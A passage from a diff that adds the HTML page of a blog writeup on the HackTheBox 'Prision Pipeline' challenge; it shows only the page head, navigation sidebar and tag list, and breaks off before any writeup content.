@@ -1,0 +1,481 @@
+﻿<!doctype html><html lang=en><head><title>HackTheBox Prision Pipeline Challenge :: X3ric Blog</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Prision Pipeline: reduce the custom rules to a scriptable check and use the smallest reliable path to the flag."><meta name=keywords content="htb,challenge,prisionpipeline,hackthebox,writeup,misc"><meta name=robots content="noodp"><link rel=canonical href=https://x3ric.com/blog/posts/HackTheBox-Prision-Pipeline-Challenge/><link rel=stylesheet href=/blog/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css><link rel=stylesheet href=/blog/css/code.min.23e47695eb566faf1938782a704a8ad64281997aaaf9d80477dce0b721fced24.css><link rel=stylesheet href=/blog/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css><link rel=stylesheet href=/blog/css/footer.min.d0697ff65cceb53dfd14a5a1ae42750385d107191fa337c4e38472792255b6a0.css><link rel=stylesheet href=/blog/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css><link rel=stylesheet href=/blog/css/header.min.0f84dcd3f57d396f00cd47214ea8f92f6048e23496e203e1fde6a769838bc50c.css><link rel=stylesheet href=/blog/css/main.min.722790c464b7c95f2c5c3e0da3b2690e3c6cf94ad7548ee4c9c978cf217df845.css><link rel=stylesheet href=/blog/css/menu.min.d4426516e31d3969fd489ed2d30f2c6bcf50efebebb328d6dc196c677ea53609.css><link rel=stylesheet href=/blog/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css><link rel=stylesheet href=/blog/css/post.min.e20b46497cbb2b2b62012032c5a407efe5acaff5a1dd4e7669ba7551f78d3f86.css><link rel=stylesheet href=/blog/css/search.min.8758897f8460d06bfadb5c1db9f687882b85f9a5120e45faeaf6f36e99128dca.css><link rel=stylesheet href=/blog/css/syntax.min.1f055be496212fdedd12924584d9e04ed09c9e7311246469e41ae50b07ea7b70.css><link rel=stylesheet href=/blog/css/terminal.min.3d48b463c918cdcf7d2b15cb5b5d21b0c91a5a5ad6715366d79921664daf3574.css><link rel=stylesheet href=/blog/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css><link rel=stylesheet href=/blog/style.css><link rel="shortcut icon" href=/blog/favicon.png><link rel=apple-touch-icon href=/blog/apple-touch-icon.png><meta name=twitter:card content="summary"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="HackTheBox Prision Pipeline Challenge"><meta property="og:description" content="Prision Pipeline: reduce the custom rules to a scriptable check and use the smallest reliable path to the flag."><meta property="og:url" content="https://x3ric.com/blog/posts/HackTheBox-Prision-Pipeline-Challenge/"><meta property="og:site_name" content="X3ric Blog"><meta property="og:image" content="https://x3ric.com/blog/og-image.png"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:section" content="challenge"><meta property="article:published_time" content="2024-12-11 09:20:00 +0800 +0800"><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.16.10/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.16.10/dist/katex.min.js></script><script defer src=https://cdn.jsdelivr.net/npm/katex@0.16.10/dist/contrib/auto-render.min.js></script></head><body><header class=header><div class="header__inner center"><div class=header__logo><a href=https://x3ric.com/blog/><div class=logo><span class=logo-bracket>[</span>x3ric<span class=logo-bracket>]</span></div></a></div><div class=header__nav><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/blog/tags/>Tags</a></li><li><a href=/blog/categories/>Categories</a></li><li class=spacer></li><li><a href=/blog/writeups/>Writeups</a></li><li><a href=/blog/about>About</a></li><li><a href=/blog/rss.xml>RSS</a></li></ul></nav></div><div class=header__right><button class=menu-trigger aria-label=Menu>
+<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="6" x2="21" y2="6" class="line-top"/><line x1="3" y1="12" x2="21" y2="12" class="line-mid"/><line x1="3" y1="18" x2="21" y2="18" class="line-bot"/></svg></button></div></div></header><div class=site-shell><aside id=site-sidebar class=site-sidebar aria-label="Site navigation" tabindex=0><a class=side-brand href=/blog/><span class=side-brand__line><svg class="ico ico-terminal ico-sm" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="m5 7 5 5-5 5"/><path d="M12 17h7"/></svg>
+<span class=side-brand__mark>[x3ric]</span></span>
+<span class=side-brand__meta>blog</span></a><form class="side-search top-search-form" data-search-live action=/blog/search/ role=search><input class=top-search-input type=search name=q placeholder=Search aria-label=Search autocomplete=off spellcheck=false></form><nav class=side-nav><details class="side-group side-disclosure side-disclosure--meta" open><summary class="side-group__head side-disclosure__summary"><span class=side-disclosure__label><svg class="ico ico-terminal ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="m5 7 5 5-5 5"/><path d="M12 17h7"/></svg>
+<span>meta</span></span>
+<b>2</b>
+<span class=side-disclosure__chevron><svg class="ico ico-chevron ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="m9 18 6-6-6-6"/></svg></span></summary><div class=side-disclosure__panel><a class=nav-row href=/blog/about/><span class=nav-row__main><svg class="ico ico-user ico-sm" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="8" r="4"/><path d="M4 21a8 8 0 0116 0"/></svg>
+<span>About</span></span></a>
+<a class=nav-row href=/blog/rss.xml><span class=nav-row__main><svg class="ico ico-rss ico-sm" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M4 5a15 15 0 0115 15"/><path d="M4 11a9 9 0 019 9"/><circle cx="5" cy="19" r="1"/></svg>
+<span>RSS</span></span></a></div></details><details class="side-group side-disclosure side-disclosure--read" open><summary class="side-group__head side-disclosure__summary"><span class=side-disclosure__label><svg class="ico ico-post ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M7 3h7l5 5v13H7z"/><path d="M14 3v6h6"/><path d="M10 13h6"/><path d="M10 17h4"/></svg>
+<span>read</span></span>
+<b>391</b>
+<span class=side-disclosure__chevron><svg class="ico ico-chevron ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="m9 18 6-6-6-6"/></svg></span></summary><div class=side-disclosure__panel><a class=nav-row href=/blog/><span class=nav-row__main><svg class="ico ico-post ico-sm" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M7 3h7l5 5v13H7z"/><path d="M14 3v6h6"/><path d="M10 13h6"/><path d="M10 17h4"/></svg>
+<span>Posts</span></span><b>11</b></a>
+<a class=nav-row href=/blog/writeups/><span class=nav-row__main><svg class="ico ico-writeup ico-sm" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16v16H4z"/><path d="M8 8h8"/><path d="M8 12h8"/><path d="M8 16h5"/></svg>
+<span>Writeups</span></span><b>380</b></a></div></details><details class="side-group side-disclosure side-disclosure--index" open><summary class="side-group__head side-disclosure__summary"><span class=side-disclosure__label><svg class="ico ico-folder ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M3 6h7l2 2h9v13H3z"/><path d="M3 10h18"/></svg>
+<span>index</span></span>
+<b>map</b>
+<span class=side-disclosure__chevron><svg class="ico ico-chevron ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="m9 18 6-6-6-6"/></svg></span></summary><div class=side-disclosure__panel><a class=nav-row href=/blog/tags/><span class=nav-row__main><svg class="ico ico-tag ico-sm" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span>Tags</span></span><b>136</b></a>
+<a class=nav-row href=/blog/categories/><span class=nav-row__main><svg class="ico ico-folder ico-sm" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M3 6h7l2 2h9v13H3z"/><path d="M3 10h18"/></svg>
+<span>Categories</span></span><b>4</b></a></div></details><details class="side-group side-disclosure side-tax side-tax--categories" open><summary class="side-group__head side-disclosure__summary"><span class=side-disclosure__label><svg class="ico ico-folder ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M3 6h7l2 2h9v13H3z"/><path d="M3 10h18"/></svg>
+<span>categories</span></span>
+<b>4</b>
+<span class=side-disclosure__chevron><svg class="ico ico-chevron ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="m9 18 6-6-6-6"/></svg></span></summary><div class="side-disclosure__panel side-tax-list"><a class=side-tax-index href=/blog/categories/><span class=side-tax-index__main><svg class="ico ico-folder ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M3 6h7l2 2h9v13H3z"/><path d="M3 10h18"/></svg>
+<span>All categories</span></span>
+<b>4</b>
+</a><a class="side-tax-chip side-tax-chip--category tax-categories" href=/blog/categories/challenge/><svg class="ico ico-folder ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M3 6h7l2 2h9v13H3z"/><path d="M3 10h18"/></svg>
+<span class=side-tax-name>Challenge</span>
+<b class=side-tax-count>318</b>
+</a><a class="side-tax-chip side-tax-chip--category tax-categories" href=/blog/categories/machine/><svg class="ico ico-folder ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M3 6h7l2 2h9v13H3z"/><path d="M3 10h18"/></svg>
+<span class=side-tax-name>Machine</span>
+<b class=side-tax-count>62</b>
+</a><a class="side-tax-chip side-tax-chip--category tax-categories" href=/blog/categories/notes/><svg class="ico ico-folder ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M3 6h7l2 2h9v13H3z"/><path d="M3 10h18"/></svg>
+<span class=side-tax-name>Notes</span>
+<b class=side-tax-count>11</b>
+</a><a class="side-tax-chip side-tax-chip--category tax-categories" href=/blog/categories/systems/><svg class="ico ico-folder ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M3 6h7l2 2h9v13H3z"/><path d="M3 10h18"/></svg>
+<span class=side-tax-name>Systems</span>
+<b class=side-tax-count>1</b></a></div></details><details class="side-group side-disclosure side-tax side-tax--tags" open><summary class="side-group__head side-disclosure__summary"><span class=side-disclosure__label><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span>tags</span></span>
+<b>136</b>
+<span class=side-disclosure__chevron><svg class="ico ico-chevron ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="m9 18 6-6-6-6"/></svg></span></summary><div class="side-disclosure__panel side-tax-cloud"><a class=side-tax-index href=/blog/tags/><span class=side-tax-index__main><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span>All tags</span></span>
+<b>136</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/htb/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>HackTheBox</span>
+<b class=side-tax-count>373</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/linux/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Linux</span>
+<b class=side-tax-count>134</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/crypto/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Crypto</span>
+<b class=side-tax-count>78</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/rev/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Rev</span>
+<b class=side-tax-count>47</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/web/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Web</span>
+<b class=side-tax-count>43</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/misc/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Misc</span>
+<b class=side-tax-count>42</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/firmware/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Firmware</span>
+<b class=side-tax-count>27</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/hardware/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Hardware</span>
+<b class=side-tax-count>27</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/signal/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Signal</span>
+<b class=side-tax-count>27</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/hash/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Hash</span>
+<b class=side-tax-count>24</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/pwn/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>PWN</span>
+<b class=side-tax-count>23</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/rsa/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>RSA</span>
+<b class=side-tax-count>22</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/windows/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Windows</span>
+<b class=side-tax-count>21</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/aes/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>AES</span>
+<b class=side-tax-count>20</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/xor/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Xor</span>
+<b class=side-tax-count>18</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/active-directory/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>ActiveDirectory</span>
+<b class=side-tax-count>17</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/lattice/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Lattice</span>
+<b class=side-tax-count>14</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/android/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Android</span>
+<b class=side-tax-count>13</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/kerberos/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Kerberos</span>
+<b class=side-tax-count>13</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/mobile/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Mobile</span>
+<b class=side-tax-count>13</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/prng/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>PRNG</span>
+<b class=side-tax-count>13</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/ecc/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>ECC</span>
+<b class=side-tax-count>12</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/gamepwn/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>GamePwn</span>
+<b class=side-tax-count>12</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/ldap/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>LDAP</span>
+<b class=side-tax-count>11</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/notes/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Notes</span>
+<b class=side-tax-count>11</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/ai/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>AI</span>
+<b class=side-tax-count>10</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/forensics/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Forensics</span>
+<b class=side-tax-count>10</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/neural-network/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>NeuralNetwork</span>
+<b class=side-tax-count>10</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/php/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>PHP</span>
+<b class=side-tax-count>10</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/prompt-injection/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>PromptInjection</span>
+<b class=side-tax-count>10</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/code/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Code</span>
+<b class=side-tax-count>9</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/rce/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
